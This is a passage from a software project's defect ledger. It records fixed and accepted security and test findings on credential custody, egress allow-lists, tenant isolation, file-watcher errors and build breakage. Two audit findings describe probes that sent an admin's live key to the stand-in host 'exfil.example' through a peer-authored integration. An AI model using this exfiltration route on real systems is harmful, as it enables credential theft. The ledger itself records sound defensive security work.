  above) and now records that the control is a single toggle, not a menu; and the console rule now
  warns that a visible spinner is not by itself proof of a hang. The per-page
  "(Observed at authoring time - ...)" parentheticals were left as-authored: they are historical
  notes attached to checks that remain correct expectations, and rewriting the ones I did not
  individually re-drive would trade one set of unverified claims for another.
  LESSON: a discovery run against a cold dev server records compile latency as product defect. Warm
  the routes first, or confirm the request actually hung before pinning it.

- **`two-specs-failed-on-a-by-design-404-the-rest-of-the-suite-filters`** (FIXED 2026-08-05, LOW,
  test correctness — pre-existing, found while verifying the Drill run). `shell-nav.spec.ts` and
  `pages-manage.spec.ts` failed on /integrations with two console 404s. The 404 is CORRECT and
  deliberate: `/integrations` probes `GET /api/v1/sync/citius/notificacoes/state`, and
  `api/src/routes/sync.ts` answers 404 for a flag-disabled rail *specifically so* the panel can tell
  "not for this deployment" apart from a failure and render nothing at all — the contract is spelled
  out in `web/lib/sync/citius-sync.ts` (`kind: 'unavailable'`). `fetch` logs the 404 regardless of
  how the app handles it, so any spec visiting /integrations with a strict console bar fails on a
  handled, designed answer. 20 of the suite's specs already filter the URL-less
  "Failed to load resource" line for exactly this reason; these two did not. FIXED by giving both the
  documented pattern (document-redline.spec.ts): drop the URL-less console line, then pin 4xx/5xx
  from `response` events BY URL with the by-design probe excluded. Net effect is a STRICTER bar than
  before — both specs now also catch `pageerror`s and every other non-2xx by URL, neither of which
  they were checking. NOT a product defect: no change to the sync rail.

- **`org-shared-credential-egress-was-authored-by-the-reader`** (FIXED 2026-08-03, CRITICAL,
  credential exfiltration - found by the B2+C2 fresh-context review, on the branch BOTH slices
  documented as safe). B2 and C2 each moved the egress allow-list onto the Cofre item and each
  reported RUN_SPEC criterion 3 met. Neither looked at the NO-ITEM branch, where both rails fell
  back to `declaredOriginsForIntegration(actor, key)` - the definition AS THE READER RESOLVES IT.
  An integration definition resolves per (key, PRINCIPAL): `getForActor` answers the reader's own
  `private` row before any `org`/`global`/baseline one. So for an ORG-SHARED config (any org-admin
  connect) a same-org peer with role `user` could `PUT /api/v1/integration-builder/package` their
  own package under that key - accepted whenever the org held no row for it, i.e. whenever the key
  resolved to a `global`/legacy-runtime publication or to nothing yet - and thereby author BOTH the
  action that runs AND the hosts the ADMIN's credential may be sent to. Probe, through documented
  wire surfaces only: `save {"ok":true,"created":true}`, then `exec {"success":true}` with
  `https://exfil.example/collect?k=pk-live-...` carrying the org-admin's live key, on the executor
  rail AND on the automation `api_call` rail. C2's docblock called this branch "ENFORCE the declared
  hosts" without asking who declared them. The precondition is ordinary: 5 of the 11 shipped
  packages declare a BARE templated `baseUrl` (`{{api_base}}`, `{{api_access_point}}`,
  `{{graph_base_url}}` - zoho-sign, adobe-acrobat-sign, invoicexpress, whatsapp, ifthenpay), which
  binds to nothing, so `mintOrRefreshCredentialShadow` returns null and there is no item.
  FIXED by resolving the definition as the credential's CUSTODIAN, never the reader
  (`definitionActorForCredential`), for the ACTION and the ALLOW-LIST alike, from one shared rule
  both rails call (decisions.md 2026-08-03). Pinned in
  `api/tests/security/integration-credential-custody.test.ts` (both rails, the literal-host variant,
  the unstamped-legacy-row fallback, and the fail-closed grounds).
  LESSON: two independent reviews accepted "the declared hosts" as a safe allow-list because the
  sentence never named an author. A derivation whose result depends on WHO asks is not a property of
  the artifact, and a docblock that omits the principal is not a description of the control.

- **`a-rotation-took-credential-custody-on-a-stale-join`** (FIXED 2026-08-03, HIGH, credential
  custody - same review). `persistRotatedCredentials` guarded custody with
  `!target.cofreItemId && target.ownerUserId == null`, which describes ONE shape of the problem
  rather than the rule. It missed the stale join: the item's owner deletes it (a supported
  `DELETE /cofre/items/:id`), `updateIntegrationCredentialValue` answers `stale`, and the shadow
  write then minted a FRESH, auto-granted `until_locked` item holding the admin's bundle in the
  RUNNING user's own Cofre and re-stamped `cofreItemId` onto the row. Probe:
  `custody after stale re-save: u-admin2`. From there the new owner reads the value through
  `resolveEnvInjection` and holds the lock switch over a credential they never typed. FIXED by
  removing the capability rather than widening the guard: `mintOrRefreshCredentialShadow` takes an
  explicit `ceremony | rotation` mode and the rotation mode has no mint branch, does not touch
  `boundOrigins`, does not re-grant and does not re-stamp the custodian. Pinned in
  `api/tests/security/integration-credential-custody.test.ts` (stale join, absent item, the
  boundOrigins re-bind a peer-triggered rotation used to be able to perform, and the locked case).

- **`lock-did-not-revoke-on-the-automation-backed-branch`** (FIXED 2026-08-03, MEDIUM, credential
  custody - same review). C2's executor resolved the egress binding only on the `api-call` dispatch
  path; `browser-steps` and materialised `bash-cli` returned into the automation seam with
  `credentialFields: resolvedFields` BEFORE the binding was ever consulted, so a LOCKED Cofre item
  did not stop the decrypted bundle reaching them. Blast radius was bounded by the engine
  (`automation/template-vars.ts` redacts `{{input.credentials...}}` and only `storageState` is
  consumed), but "one egress truth" covered one of two branches. FIXED: the binding is resolved
  BEFORE the dispatch and a `refused` binding refuses both branches - ahead of the automation-seam
  check, so a revoked credential and a missing seam can never be confused. The ORIGIN half is not
  enforceable from there and the docblock now says exactly that instead of implying otherwise.
  Pinned in `api/tests/security/integration-credential-custody.test.ts` (locked refuses, granted
  proceeds, unbound proceeds).

- **`integration-egress-unbound-when-no-item-and-no-literal-host`** (ACCEPTED 2026-08-03, MEDIUM,
  credential egress). On the ACTION EXECUTOR rail only, a config with no Cofre item whose definition
  declares no literal host at all keeps the pre-C2 posture: SSRF guard, no origin binding. The
  automation `api_call` rail has no such branch (an empty allow-list refuses there by construction).
  MEASURED before accepting: the class is exactly the bare-templated-`baseUrl` packages - 5 of the
  11 shipped ones - and refusing it would take the shipped Zoho Sign signing rail offline for every
  org-shared connect. What the 2026-08-03 fix changed is not whether the branch exists but WHO
  writes the definition it reads: always a principal who could have connected the credential, never
  an arbitrary reader. Closes when a templated host can be bound at connect, or at the 2026-08-15
  Rule-10 cutover when every config carries an item. Characterised by
  `api/tests/security/integration-credential-custody.test.ts` ("the templated class is not taken
  offline").

- **`org-shared-config-peer-got-the-author-widened-origin-list`** (FIXED 2026-08-03, CRITICAL,
  credential egress - found by the B2 fresh-context review, NOT by the suite, which pinned the
  residual only in its harmless direction). B2 moved the credential-egress allow-list onto the Cofre
  item's `boundOrigins` so an action authored after the connect could not widen it. For ORG-SHARED
  configs it did not: the item belongs to the admin who typed the credentials, a same-org peer
  resolved `unreachable`, and the resolver FELL THROUGH to the definition-derived list - the exact
  artifact the slice exists to stop trusting. Probe, through the real `executeApiCallStep`: `bob`
  (role `user`, owns nothing, typed nothing) resolved `["api.crm.example","exfil.example"]` and sent
  the ADMIN's live key to `https://exfil.example/collect?k=...`, `status completed`. Not
  cross-tenant and not a regression (pre-B2 everyone got that list), but the slice's acceptance
  criterion was unmet for the whole class while the journal called the residual benign. FIXED by an
  explicit `sharedConfig` reach through the server-stamped join (decisions.md 2026-08-03): a peer is
  now bound by the admin's item and refused when the admin locks it, and a config with an
  unresolvable join refuses instead of falling back. Pinned in
  `api/tests/security/integration-credential-scope.test.ts` (the probe above, asserting fetch was
  never called) and `api/tests/integrations/credential-cofre.test.ts` (the resolver, widened AFTER
  the connect - the asymmetry the original pin was missing).
  LESSON: the original test asserted the peer's list EQUALLED the connect-time host and never
  widened the definition afterwards, so it passed with the hole fully open. A residual pinned only
  in the direction where it is harmless is not pinned.

- **`org-shared-config-delete-left-a-live-extractable-orphan`** (FIXED 2026-08-03, HIGH, credential
  custody - same review). `deleteConfig` deletes every row the actor may WRITE, and an org-shared row
  is writable by any org-admin; the shadow discard was owner-scoped. So admin B deleting admin A's
  config left A's item alive (`unlocked_until_locked`, still bound, joined to a row that no longer
  exists) and EXTRACTABLE: `resolveEnvInjection` unwraps by item id alone under `{kind:'process'}`
  (no origin binding, no link check) and the id is in the owner's own `GET /cofre/items` - the probe
  returned the plaintext credential in the injected env. `discardCredentialShadow` also returned
  void and the caller discarded the boolean, so it happened with no log, no status and no trace.
  FIXED: the discard reaches the owner's item for an org-shared config, `purgeCofreItem` sweeps the
  grants for the ITEM's owner rather than the deleter, and the outcome is a
  `discarded|absent|orphaned|error` status that both layers log. Pinned by the extraction probe
  itself (`resolveEnvInjection` before -> plaintext, after the peer-admin's delete -> NOT_FOUND).
  LESSON: `deleteCofreItem`'s comment claimed "no orphan standing unlock is left behind" and the
  code was owner-scoped; the claim was true only for the case the tests exercised.

- **`origin-binding-is-host-only-and-subdomain-wide`** (ACCEPTED 2026-08-03, LOW, by design for now -
  raised as L3 by the B2 review). `hostMatchesOrigin` (`api/src/security/origin-binding.ts`) matches
  a bound entry against a request host EXACTLY or as a parent domain of it, and it compares hosts
  only. Consequences, stated plainly because B2 made `boundOrigins` THE credential-egress control
  and it therefore inherits them: a bound `api.crm.example` also authorises `eu.api.crm.example` and
  any OTHER PORT on the bound host, and the scheme is not part of the binding either. Whoever
  controls a subdomain of a bound host, or any service on another port of it, is inside that
  credential's blast radius. NOT tightened here: the matcher is shared with session items and the
  pre-B2 declared-origin derivation, `security/origin-binding.ts` was outside this response's
  ownership, and narrowing it is a behaviour change for every credential in the product rather than
  a review fix. CHARACTERISED instead, so an undocumented widening cannot pass unnoticed:
  `api/tests/security/integration-credential-scope.test.ts` pins that a look-alike sibling domain is
  refused while a subdomain and an alternate port are SENT. CLOSE BY: decide whether the Cofre binds
  origins (scheme + host + port) rather than hosts, and whether subtree matching should be opt-in
  per item, then move the matcher with its suite.

- **`ws-c-comparator-does-not-cover-the-action-executor-rail`** (CLOSED 2026-08-03 by C2's 102f302,
  MEDIUM, migration evidence - raised as M1 by the B2 review). RESOLUTION: the third rail was closed
  independently and in parallel by slice C2, which wired `observeCredentialShadow` into
  `action-executor.ts` (see its import and the call on the decrypt path). All three rails now feed
  the Rule-10 sample, so the 2026-08-15 cutover is decided on an unbiased one. Recorded rather than
  silently deleted because the entry was accurate when written: B2 correctly refused to reach into
  another slice's live file and named the gap instead, and C2 closed it from its own side.
  ORIGINAL FINDING FOLLOWS. B2 claimed the Rule-10 comparator ran
  on "every real credential read, per api_call step and per listener tick". It ran on ONE rail (the
  `setIntegrationCredentialLoader` seam, consumed only by `automation/executors/api-call.ts`). This
  response added the served-app Zoho Sign rail, so two of three are covered; the third,
  `integrations/action-executor.ts`, decrypts the config itself and is BOTH the integration-action
  route and the listener rail (`event-sources/user-defined-poll.ts` polls through it), so listener
  ticks are measured nowhere. It was slice C2's live surface and could not be touched here; the code
  now names it as uncovered instead of implying coverage. CONSEQUENCE IF NOT CLOSED: the 2026-08-15
  cutover decision is made on a biased sample - the rails that rotate credentials most are the ones
  not being measured. CLOSE BY: call `observeCredentialShadow(actor, config, fields)` after
  `decryptCredentialFields` in `action-executor.ts`, then re-read the census.

- **`artifact-family-test-leaks-watchers`** - **SLUG RETAINED AS AN ANCHOR ONLY; THE NAME IS PART
  OF WHAT WAS WRONG.** The observable it recorded (contract lane: all tests pass, exit 1, unhandled
  `EMFILE ... watch`) was real and is now **FIXED 2026-08-19**. Its DIAGNOSIS was wrong on the
  mechanism AND on the culprit, and the entry is corrected in place rather than deleted, because
  the wrong diagnosis is the more useful half of the record. Original text preserved at the bottom.

  **What was actually wrong, measured rather than inferred.**

  1. *Not a leak, and not that suite.* `api/tests/contract/artifact-family.test.ts` calls
     `appRegistry.stop()` in `afterAll`, and `api/tests/contract/build-failure.test.ts` calls it in
     BOTH `afterAll` and `beforeEach`; `stop()` closed every watcher it had opened. The paths in
     the EMFILE reports are under `/tmp/ekoa-bf-*`, which is `build-failure.test.ts`'s temp root -
     the other suite. Both halves of "that suite creates watchers it never closes" are false.
  2. *Watchers are not the resource.* libuv keeps ONE inotify instance per EVENT LOOP and every
     `fs.watch` in the process adds a watch DESCRIPTOR to it. Measured on this host (chokidar
     5.0.0 / Node 20.19.4 / Linux 6.17): **300 chokidar watchers in one process = 1 inotify
     instance**, and 8 worker threads each watching one path = 8 instances. So even a genuine leak
     of N per-app watchers could not consume N instances, and no per-app-watcher count can exhaust
     `fs.inotify.max_user_instances`.
  3. *The real cause is the resource being taken by OTHER processes, plus our own missing error
     handler.* `max_user_instances` is 128 and is **per USER, not per process**. Ordinary use of
     this dev box (browsers, `next` dev servers, webpack, concurrent agent sessions) sits at 92-122
     of 128 - measured repeatedly while closing this. When it is at the cap, the vitest fork cannot
     obtain its ONE instance, so EVERY `fs.watch` inside it fails `EMFILE`. `app-registry.ts`
     attached **no `error` listener** to its chokidar watchers, so each failure became an unhandled
     rejection; vitest fails a run on unhandled rejections even when every test passes. The count
     (~11) tracked REGISTRATIONS - measured at one report per watcher created, so ~11 reports meant
     ~11 `register()` calls in that lane - not leaked watchers.
  4. *The ledger already had the right answer, one entry earlier.* `npm-ci-has-been-broken-on-main`
     (2026-08-01) records exactly this: "105 long-lived headless chromium processes from a parallel
     tool held 96 [instances] ... All 3376 tests passed; only watcher creation failed." The
     2026-08-02 entry cited it and explicitly ruled it out. That is the expensive lesson here: the
     correct diagnosis was already written down and was dismissed in favour of a plausible one that
     nobody measured.

  **SECOND CORRECTION, 2026-08-19 (adversarial verification of the first one). THE ESCALATION THIS
  PARAGRAPH USED TO CARRY WAS FALSE AND IS WITHDRAWN.** It read: "this was never only a test
  problem - under Node's default `--unhandled-rejections=throw`, the identical condition on a
  server host kills the API process". It does not, and `api/src/server.ts` is where that was
  checkable all along. `boot()` installs `process.on('uncaughtException')` and
  `process.on('unhandledRejection')` - both log and continue - as its FIRST two statements, before
  `loadConfig()`, before `buildApp()`, and therefore long before `bootState()` reaches
  `appRegistry.start()`. Registering an `unhandledRejection` listener also switches Node's
  `--unhandled-rejections=throw` default off outright (measured on Node 20.19.4: the same unhandled
  EMFILE rejection kills the process and exits 1 with no listener; with a listener installed it logs,
  the process keeps running its timers, and it exits 0), and server.ts's own header records this as
  carried policy - "process-level exception posture: uncaughtException/unhandledRejection log and
  continue". On a server host this condition therefore
  produced a `[unhandledRejection]` log line per failing watch and nothing else. The API process was
  never at risk from it.
  The TEST half of the claim stands, and is the whole reason this was worth fixing: **vitest fails a
  RUN on an unhandled rejection regardless of any process-level listener**, which is exactly the
  observable this entry opened on. Recorded at this length because an entry written to correct a
  wrong diagnosis is the last place that should overstate in the other direction - and this one did
  it on its second line, in the same move that corrected somebody else's overreach.

  **Deterministic repro, and it needs nothing global.** The original observable was reproducible
  only by luck of host load, and the first repro written for it still needed the whole per-user
  inotify instance pool occupied by a helper process - disruptive on a box running several agent
  sessions. It is not the only way to make chokidar raise an `error`: an unreadable directory
  inside a watched dist does it with a chmod. `mkdir <projectDir>/dist/locked && chmod 000` on it,
  register the app, and chokidar emits `EACCES: permission denied, watch '<dist>/locked'` down the
  same `_handleError` path EMFILE takes. Measured both ways on this host:
  - **without the error listener**: the test itself reports PASSED, and the run prints
    `Unhandled Rejection - Error: EACCES: permission denied, watch ...` and **exits 1**. That is
    the finding's original signature exactly - green tests, red run.
  - **with it**: **exit 0**, zero unhandled rejections, one `[app-registry] watcher error:` warning
    (EMFILE/ENOSPC take the deduplicated capacity branch instead), and the app still registered and
    served.
  Committed as a case in `api/tests/apps/app-registry-watch-live.test.ts`, which probes first and
  skips where mode bits cannot deny (root, or a filesystem that ignores them).

  **FIXED** in `api/src/apps/app-registry.ts`: (a) every app's watcher carries an `error` listener
  that degrades EMFILE/ENOSPC to a warning, deduplicated by a registry-level flag so one host
  condition produces ONE warning however many apps are served - this is the actual fix, and the
  only part of the change the observable required; (b) `register()`/`unregister()` are serialised
  per appId, closing the guard-then-`await` window that let two concurrent registers for one id
  leave the first's watcher open forever, and `stop()` now DRAINS in-flight ops before tearing the
  state down, which closes that same orphan from the other side (a register in flight across a stop
  used to resume afterwards and arm a watcher nothing held a reference to); (c) the manifest/dist
  test is by whole path - `<projectDir>/manifest.json` exactly, and dist matched on a path SEGMENT -
  rather than `endsWith('manifest.json')`, which also claimed a build output named
  `app-manifest.json` and swallowed its dist notification; (d) debounce timers are keyed
  appId -> file instead of a flat `${appId}:${filePath}` map swept by `startsWith('${appId}:')`,
  which let an app called `a` cancel the pending reload of an unrelated app called `a:b` (a
  manifest's `id` is any non-empty string, and boot puts every user's apps in that one map). Pinned
  by
  `api/tests/apps/app-registry-watcher.test.ts` (chokidar and manifest reads mocked: per-app
  watchers, the ignore pattern asserted by SOURCE rather than by a RegExp in the expected position,
  event handling, unregister isolation, stop-then-register re-arming, no surviving timers, the error
  listener and its dedup, the stop-drain) and `api/tests/apps/app-registry-watch-live.test.ts` (real
  chokidar + real fs: the repro above, event delivery, shared and nested trees, and watch-descriptor
  accounting counted out of `/proc/self/fdinfo`; skips, rather than reddening, when the host itself
  cannot watch).

  **TRIED, MEASURED, AND REVERTED: one watcher for the whole registry.** The first attempt at this
  fix also collapsed the per-app `Map<appId, FSWatcher>` into a single lazily-created watcher driven
  with `add()`/`unwatch()`, on the premise that watcher count was the scarce resource. Per (2) it is
  not, and the collapse then broke three things that per-app `close()` gets right:
  - *It leaked the descriptors it was meant to conserve.* `FSWatcher.unwatch(path)` closes only the
    closers registered under that exact path string (chokidar 5.0.0 `_closePath`); every directory
    chokidar discovered BELOW it keeps its own live `fs.watch`. Measured by counting `inotify wd:`
    lines in `/proc/self/fdinfo` with 8 apps of `dist/` + 10 subdirectories: armed 96 descriptors,
    after unregistering all 8 the collapsed version still held 80; per-app `close()` held 0. The
    process footprint would have become the high-water mark of every app ever registered, reachable
    from `POST /api/company-space/:artifactId/stop` and `POST /api/dev/unregister`.
  - *`unwatch()` is permanent.* It calls `_addIgnoredPath(path, {recursive:true})`, so unregistering
    an app NESTED in another app's tree blinded the enclosing app for that subtree for the life of
    the watcher, and re-registering did not heal it.
  - *It silently narrowed the listener contract.* Routing one shared watcher's event to a single
    winning app meant that of two ids registered over the same project dir (what a fork or rename
    mid-flight leaves behind) only the first-registered was ever notified; per-app watchers notify
    both, as they always had.
  All three are now pinned as live measurements in `app-registry-watch-live.test.ts` rather than as
  assertions about bookkeeping, and all three go red against the collapsed implementation.

  **NOT fixed, because it does not exist:** a "~128 apps" production ceiling. Per (2) above, the
  per-user cap a Cortex host serving many apps can actually reach is `max_user_watches` (65536
  here; one per watched file and directory), which is a function of the PATHS watched and is
  identical before and after this change.

  ORIGINAL FINDING FOLLOWS, VERBATIM. **`artifact-family-test-leaks-watchers`** (OPEN 2026-08-02,
  MEDIUM, test-estate — found by an
  adversarial reviewer running the contract lane, not by the lane failing informatively).
  `npm run test --workspace api -- --run tests/contract` reports **all tests passing** and then
  **exits 1** on ~11 unhandled `EMFILE ... watch` rejections from chokidar attributed to
  `api/tests/contract/artifact-family.test.ts`. `ulimit -n` is over a million, so this is inotify
  WATCHER/INSTANCE exhaustion, not a file-descriptor cap — that suite creates watchers it never
  closes. Consequence, and the reason it is worth a row: a green contract lane cannot be claimed
  honestly from that command's exit code, so the failure teaches everyone to ignore exit 1 there —
  exactly the habit that hides a real red. Related but distinct from the pre-existing
  `fs.inotify.max_user_instances` note in `npm-ci-has-been-broken-on-main` (that one was another
  process's browsers; this is our own suite leaking). CLOSE BY: close the watchers in that suite's
  teardown (or stub the watcher), then assert the lane exits 0.

- **`secretregistry-serialized-credentials-in-plaintext`** (FIXED 2026-08-01, HIGH, credential
  disclosure — found while WRITING a test for it, not by the test passing). `SecretRegistry`
  (`api/src/security/redaction.ts`) keeps its state in a `Map`/`Set`, so `JSON.stringify(registry)`
  renders `{}` — which is what made a "no credential value escapes" assertion look sound. But
  `orderedSecrets()` MEMOISES into `orderedCache`, a plain array of `{handle, value, forms}`. So the
  FIRST `redact()` call converts any registry into an object that `JSON.stringify`s every live
  credential in plaintext, base64/urlencoded forms included. Registries ride on the results of
  `typistLogin`, `deliverSecretToDaemon` and `ensureSession`, and those results are logged, written
  into automation step records, and pushed onto SSE — so a registry that had done its job once could
  serialise the credential it exists to hide. FIXED at the class: a `toJSON()` returning counts only
  (`{secrets, unmaskable}`) plus a `nodejs.util.inspect.custom` hook, which also hardens the
  pre-existing bridge callers. Test ordering is the proof: it calls `redact()` FIRST and only then
  asserts `JSON.stringify` / `util.inspect` are clean.
  LESSON: an assertion that passes because of an incidental representation detail (a Map
  stringifying to `{}`) is not a proof. The sentinel-based test only became real when it drove the
  registry through the path that populates the cache.

- **`app-sso-graph-tokens-flat-unscoped-crypto`** (OPEN 2026-08-01, MEDIUM, crypto-at-rest — found by
  the B1 fresh-context adversarial review, out of that slice's scope). `api/src/integrations/app-sso.ts`
  stores Microsoft Graph OAuth tokens in `session.graphTokensEnc` (`app-sso-sessions.ts:36`) via the
  flat, UNSCOPED `encrypt`/`decrypt` (app-sso.ts ~574/624/635) — a plaintext-at-rest credential blob
  with no org binding, the same class B1 just closed on `integration_configs.credentialsCiphertext`
  but a DIFFERENT field, so genuinely outside B1. CLOSE BY: move this field onto
  `envelopeEncrypt`/`envelopeDecrypt` scoped to the session's org (same treatment as B1), with a v2
  assertion; fold into the B2 Cofre/WS-C slice or a dedicated follow-up. Do NOT let "integration_configs
  done" read as "all integration credentials done".

- **`runtime-integration-packages-are-global`** (FIXED 2026-08-02, HIGH, tenancy/confidentiality -
  found by the integrations-unification discovery gate, `docs/INTEGRATIONS_UNIFICATION_AUDIT.md`).
  User-created integration packages have NO ownership model: any authenticated user of any org
  saves via the builder (`api/src/routes/integration-builder.ts:210`, `requireAuth` only, any
  role) into ONE global filesystem tier (`<dataDir>/integrations/runtime/<key>/`,
  `api/src/integrations/definitions.ts:219,380`), and `GET /api/v1/integrations` returns every
  definition unfiltered to every tenant (`api/src/routes/integrations.ts:41`). So a user-created
  integration is globally visible across tenants TODAY - the inverse of the unification brief's
  private-by-default, and the definition itself (SKILL.md prose, credentialGuide, action
  templates, baseUrls) can carry client-specific values, which for law-firm tenants is exactly
  the leak class the brief's publish-scrub exists for. Credentials are NOT exposed (config rows
  are org-scoped with their own ciphertext); the leak surface is the definition. CLOSE BY:
  tenant-scoped definition storage (Mongo via `OwnerVisibilityScoped`) with private-by-default +
  an isolation suite of the memvault class; interim mitigation if needed sooner: filter the list
  endpoint by creator org. Planned as a prerequisite slice of the unification build.
  FIXED FOR NEW WRITES (run 20260801-171149); the INHERITED disk rows are an explicitly-tracked
  residue until the operator acts (see below). READ path by A2 (tenant-scoped registry,
  baseline-only fallback, probe-verified across all four entry points incl. the baseline-key
  collision); WRITE path by A3 - builder saves land in `integration_definitions`
  private-by-default stamped from the verified actor (`definition-save.ts`), the disk runtime
  tier is FROZEN and retired from every sync read (load/refresh-keys/integrationSkillMd/
  integrationAutomationTemplate are baseline-only, so the org-admin refresh no longer enumerates
  other tenants' keys), and the events webhook-policy reads resolve tenant-scoped under the
  trigger's owner and fail closed org-less.
  THE HONEST RESIDUE (A3 fresh-context review F2, 2026-08-03): the legacy on-disk packages are NO
  LONGER auto-imported at boot. The boot scan is REPORT-ONLY by default - it names what WOULD be
  imported and persists nothing; setting `EKOA_IMPORT_LEGACY_RUNTIME=1` imports them as journaled
  `global`/`legacy-runtime` rows (their pre-A3 effective visibility - i.e. STILL cross-tenant
  until a super-admin retires each row through the reversible E1 surface). Until the operator
  imports or retires them, the packages resolve for nobody (availability regression accepted over
  a silent global publish - deviation from RUN_SPEC assumption 3, decisions.md 2026-08-03).
  Rule-10 review 2026-08-15 (decisions.md 2026-08-02) decides the directory's end state. Pinned
  by: `tests/security/integration-definition-visibility` (store isolation),
  `tests/integrations/definition-save.test.ts` (private-by-default + actor stamping),
  `tests/integrations/definitions-runtime.test.ts` (frozen tier, every sync surface),
  `tests/integrations/refresh-enumeration.test.ts` (route-level enumeration closed),
  `tests/integrations/legacy-runtime-import.test.ts` (report-only default, opt-in import
  semantics, drift comparator, reversible retirement),
  `tests/events/webhook-policy-scope.test.ts` (owner-scoped webhook policy).

- **`integration-provision-id-not-org-scoped`** (FIXED 2026-08-02, MEDIUM, correctness/tenancy -
  found by the same discovery gate). `provisionIntegrationAutomations` materialises package
  templates as automations with deterministic id `<integrationKey>-<templateKey>` and NO org
  component (`api/src/automation/integration-automations.ts:54`); `Store.insert` swallows the
  duplicate-_id insert (`api/src/data/store.ts:28` returns false, unchecked at the call site). So
  the FIRST org to provision a template owns the row and a second org provisioning the same
  package silently gets nothing - no error, no automation. Also the pattern the unification brief
  wants for "authored actions land in the acting tenant's own copy", so it must be org-safe
  before it is reused. CLOSE BY: org-scoped deterministic id + a test provisioning the same
  package from two orgs and asserting both copies exist and are tenant-invisible to each other.
  FIXED (run 20260801-171149, slice C1): `managedAutomationId(orgId, integrationKey, templateKey)`
  is now `sha256(JSON.stringify([...]))` — the house injective composite-id discipline, not a `-`
  join (both keys may contain `-`, so a join is NOT injective). The swallowed `insert` result is
  checked: a refused insert reads the row and updates in place when it is this org's, and throws
  rather than corrupt another tenant's. COMPAT: the existing-row lookup joins on
  `source.{integrationKey,templateKey}`, never on `_id`, so a pre-C1 row keeps its original id and
  is refreshed in place — ids are live references (triggers, run history, dashboard backlinks) and
  are never renumbered. Regression proof: reverting the id to the old join fails 4 of the 8 new
  cases. The two-org case, the tenant-invisibility case, the legacy-row compat case and the
  id-injectivity case are all committed (`api/tests/automation/integration-automations.test.ts`),
  plus an HTTP-level pin in `api/tests/contract/f5-ui-endpoints.test.ts`.

- **`attended-ceremony-docblock-false-premise`** (OPEN 2026-08-01, LOW, docs/design - found by
  the discovery gate's web-research pass; full sourcing in
  `docs/INTEGRATIONS_UNIFICATION_AUDIT.md` section 7). `api/src/bridge/attended.ts:5` justifies
  the attended ceremony with "Portuguese legal portals (Citius, the Ordem dos Advogados)
  authenticate with a smartcard... A cloud browser cannot touch one." Wrong on all three counts
  for the advogado read path: Citius mandatarios logs in with username+password today (legally
  sanctioned until 2027-01-01, Portaria 350-A/2025/1 art. 39.º/3), the OA certificate is a
  downloadable `.p12` file (not a card), and the smartcard rail belongs to magistrados. The
  DESIGN survives - the ceremony is right for CC/CMD SCAP and for anyone on that rail after the
  2027 cliff - but the load-bearing rationale must become "we choose not to custody private key
  material", and the now-visible third option (server-side mTLS with a lawyer-supplied `.p12`,
  unattended, works before and after the cliff) needs an explicit accept/reject including the OA
  professional-conduct question on key custody. CLOSE BY: docblock rewrite + a decisions.md entry
  on the `.p12` custody question.

- **`npm-ci-has-been-broken-on-main`** (FIXED 2026-08-01, HIGH, build — found by a staging deploy
  failing, not by CI, because CI is the thing it breaks). `npm ci` refused the committed lockfile:
  `@napi-rs/wasm-runtime` requires `@emnapi/core@^2.0.0-alpha.3` while the lock hoisted `1.10.0`
  with no nested entry. **`npm ci` is the first step of the CI lane**, so the lane cannot have been
  passing.
  ATTRIBUTION, measured per commit rather than assumed: `f5ad86b` (pre-merge, this line of work)
  **passes**; `1984ac0` (pre-merge `origin/main`) **fails**; every commit after the merge fails
  because the merge resolved `package-lock.json` to theirs. So it arrived with the Cofre line and
  the merge carried it forward.
  WHY IT SURVIVED: every offender is an OPTIONAL `wasm32-wasi` platform package. `npm install`
  skips optional deps for other platforms and reports success; `npm ci` validates the whole tree
  including them and refuses. Local development uses `npm install`, so only a clean-machine
  install — CI, and a Docker build — ever sees it.
  FIXED (second attempt — the first, `a65f758`, did NOT work and said it did; see below): resolve
  FRESH with `node_modules` deleted as well, so npm reads the REGISTRY instead of what is on disk.
  That is the whole difference: with a tree present, `npm install` preserves installed versions and
  produces a lock that only reconciles against that tree; with it gone, resolution is clean. Result:
  57 packages up, 2 down, every override honoured (`fast-uri 3.1.5`, `postcss 8.5.25`,
  `next 16.2.12`), no Agent SDK or Playwright regression.
  A SECOND defect surfaced underneath: the fresh lock silently omitted FOUR packages that
  `eslint@9.39.5` declares — `@eslint/config-array`, `@eslint/config-helpers`, `@humanfs/node`,
  `@humanwhocodes/retry`. npm will not add them on repeated installs, because the ROOT pins
  `eslint@8` and the `@eslint/*` scope then resolves against the wrong major, so v9's own deps fall
  through. Found by enumerating all 34 of eslint 9's declared deps against the lock rather than
  fixing them one crash at a time. They are now declared explicitly in `web/package.json` at the
  versions eslint itself asks for — making an existing requirement explicit, not inventing one.
  REJECTED, and worth recording because it looks like the obvious fix: a wholesale
  `rm package-lock.json && npm install`. It produced a lock npm accepts, and moved 99 top-level
  packages — several BACKWARDS past deliberate security overrides. `package.json` pins
  `fast-uri: ^3.1.4`; the regenerated tree took `fast-uri 3.0.0-3.1.3` and the audit gate went red
  with 7 unaccepted high advisories, while a Next downgrade broke web lint. Valid to npm, wrong for
  this repo.
  THE SHARPER LESSON, in three parts, because each cost a wrong conclusion:
  1. A first attempt dropped the root `picomatch`. **`npm ci` passed anyway**, then eslint died at
     runtime with `Cannot find module 'picomatch'` — `micromatch` resolves it from the root. A green
     `npm ci` is not proof the tree WORKS.
  2. Worse, `a65f758` claimed to fix this and did not. It was verified against probe directories
     holding only the root `package.json` + lockfile and NO workspace manifests, so npm could not
     resolve the workspaces at all and its errors were artefacts of the probe. **A workspace repo's
     lockfile can only be tested in a probe carrying every workspace manifest** — the same set the
     Dockerfile COPYs. Build the probe wrong and it will lie in both directions.
  3. `npm test` can exit 1 with every test passing: `fs.inotify.max_user_instances` is 128 on this
     host, and chokidar's watchers throw `EMFILE` once it is exhausted (105 long-lived headless
     chromium processes from a parallel tool held 96). All 3376 tests passed; only watcher creation
     failed. Check `/proc/sys/fs/inotify/max_user_instances` before reading that exit code as a
     regression.

- **`thirty-specs-budgeted-waits-they-could-never-use`** (FIXED 2026-08-01, HIGH, test-estate — the
  single largest cause of this estate's "flakiness"). `playwright.config.ts` set no `timeout`, so
  Playwright's **30s default per-test cap** applied, while **30 of the 76 specs** budget individual
  assertions above it: `legal-cadeia-credito` 120s, `demo-spine`/`gateway-keys`/`legal-jurimetria`/
  `legal-rcbe` 90s, and 25 more at 60s. Every one of those budgets was DEAD CODE — the test was
  killed by the global cap before its own wait could elapse.
  The output said so plainly, on two adjacent lines, and had done for as long as the estate has
  run:
